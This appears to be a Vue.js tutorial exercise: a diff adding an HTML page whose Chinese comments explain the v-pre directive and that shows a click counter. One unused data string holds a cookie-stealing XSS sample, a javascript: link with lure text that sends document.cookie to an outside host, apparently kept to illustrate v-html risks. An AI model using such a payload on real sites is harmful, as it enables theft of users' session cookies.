@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="../vue/vue.js"></script>
+</head>
+<body>
+    <!-- 
+        本次总结：
+               v-pre指令(没有值)
+                   1.跳过其所在节点的编译过程
+                   2.可利用它跳过:没有使用指令、没有使用差值语法的节点，会加快编译
+
+                    
+     -->
+    <div class="ming">
+          <h2>Vue其实很简单</h2>
+          <h2>当前的n值是:{{n}}</h2>
+          <button @click="n++">点我加1</button>
+    </div>
+     <script>
+         Vue.config.productionTip = false
+         
+        const vm = new Vue({
+            el:'.ming',
+            data:{
+              name:'李明',
+              str:'<h1>明姐我还是想你</h1>',
+              str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟有好东西哟</a>',
+              n:1
+            },
+            
+            
+          })
+     </script>
+    
+</body>
+</html>
